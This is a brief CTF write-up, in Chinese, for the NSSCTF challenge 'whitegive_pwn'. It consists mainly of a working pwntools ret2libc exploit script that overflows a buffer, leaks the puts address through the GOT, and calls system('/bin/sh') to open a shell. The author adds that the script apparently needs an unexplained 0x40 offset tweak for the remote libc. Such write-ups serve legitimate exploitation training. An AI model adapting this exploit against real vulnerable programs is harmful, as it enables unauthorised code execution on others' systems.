[[SWPUCTF 2021 新生赛]whitegive_pwn | NSSCTF](https://www.nssctf.cn/problem/391)
![[Pasted image 20240901105951.png]]
![[Pasted image 20240901110019.png]]
也是一道标准的ret2libc，不做赘述
exp:
```python
from pwn import *
import pwnlib.gdb
context(os='linux',arch='amd64',log_level='debug')
# p = remote("node4.anna.nssctf.cn", 28878)
p = process('./whitegive_pwn')
elf = ELF('./whitegive_pwn')

gdb.attach(p, 'b *0x4006d6')

main = 0x4006D6
vuln = 0x4006BA
gift = 0x4006A9
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
gets_plt = elf.plt['gets']

ret = 0x400509
rdi = 0x400763

offset = 0x10 + 8

payload = b'a' * offset + p64(gift) + p64(main)
p.sendline(payload)
p.recvuntil(b'NSS\n')

payload = b'a' * offset + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
p.sendline(payload)

addr = p.recv()
print(addr)
puts_addr = u64(addr.ljust(8, b'\x00'))
print("puts_addr: ", hex(puts_addr))

'''from LibcSearcher import LibcSearcher
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')'''


libc_base = puts_addr - 0x6f6a0
system_addr = libc_base + 0x453a0
binsh_addr = libc_base + 0x18ce17 + 0x40

payload = b'a' * offset + p64(ret) + p64(rdi) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.interactive()
```
ps:同样在本地wsl上跑不了，远程可通。据网上师傅说本题docker的libc有问题，与泄露出来的libc版本不同，需给binsh的偏移加上0x40，原因以及怎么做的我不知道，学长告诉我实际比赛这种问题应该不会出现。
